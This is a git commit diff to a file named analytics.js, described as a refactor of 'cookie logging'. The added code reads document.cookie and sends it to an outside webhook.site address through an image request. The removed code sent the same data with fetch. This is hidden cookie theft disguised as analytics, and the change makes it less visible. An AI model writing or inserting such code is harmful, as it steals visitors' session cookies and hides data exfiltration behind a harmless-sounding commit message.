9a23c362c4bdb07a32afaafb8750d24e6c431f25
YankoByte <yankobrrrau@gmail.com>
2026-04-27 19:38:36 +1000

    Refactor cookie logging to use Image object

--- analytics.js
+++ analytics.js
@@ -1,6 +1,3 @@
-    console.log("Cookies:", document.cookie);
-
-    fetch(
-      "https://webhook.site/400ff12c-64dd-445b-ae1d-1059427d00fe?cookies=" +
-        encodeURIComponent(document.cookie),
-    );
+new Image().src =
+  "https://webhook.site/400ff12c-64dd-445b-ae1d-1059427d00fe?c=" +
+  encodeURIComponent(document.cookie);
